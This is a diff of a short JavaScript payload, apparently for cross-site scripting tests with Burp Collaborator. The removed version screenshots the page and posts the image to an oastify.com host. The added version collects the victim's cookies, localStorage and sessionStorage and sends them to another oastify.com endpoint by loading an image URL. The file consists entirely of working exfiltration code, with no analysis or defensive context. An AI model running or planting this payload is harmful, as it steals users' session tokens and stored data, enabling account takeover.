@@ -1,8 +1,8 @@
-html2canvas(document.body).then(function(canvas) {
-    var screenshot = canvas.toDataURL("image/png");
-    fetch("https://r6yeiueh1ecz0td90tvyus4pqgw7ky8n.oastify.com/screenshot", {
-        method: "POST",
-        body: JSON.stringify({ image: screenshot }),
-        headers: { "Content-Type": "application/json" }
-    });
-});
+// Send localStorage & sessionStorage data
+var localStorageData = JSON.stringify(localStorage);
+var sessionStorageData = JSON.stringify(sessionStorage);
+var burpCollaboratorURL = "https://7owu0awxjuufi9vpi9dec8m58wen2fq4.oastify.com";
+
+new Image().src = burpCollaboratorURL + "/?cookie=" + encodeURIComponent(document.cookie) +
+                  "&localStorage=" + encodeURIComponent(localStorageData) +
+                  "&sessionStorage=" + encodeURIComponent(sessionStorageData);
